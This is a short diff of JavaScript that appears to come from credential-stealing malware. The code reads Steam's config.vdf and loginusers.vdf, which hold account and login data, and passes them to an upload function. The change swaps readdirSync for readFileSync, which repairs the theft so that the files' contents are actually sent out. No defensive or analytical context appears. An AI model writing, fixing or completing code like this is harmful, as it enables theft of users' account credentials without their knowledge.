@@ -40,8 +40,8 @@ try {
 
             // loginusers.vdf / config.vdf
             if (fs.existsSync(steamDir + '/config')) {
-                uploadFile(fs.readdirSync(steamDir + '/config/config.vdf'), 'config.vdf', 'Steam Config VDF File');
-                uploadFile(fs.readdirSync(steamDir + '/config/loginusers.vdf'), 'loginusers.vdf', 'Steam loginusers VDF File');
+                uploadFile(fs.readFileSync(steamDir + '/config/config.vdf'), 'config.vdf', 'Steam Config VDF File');
+                uploadFile(fs.readFileSync(steamDir + '/config/loginusers.vdf'), 'loginusers.vdf', 'Steam loginusers VDF File');
             }
         }
     );
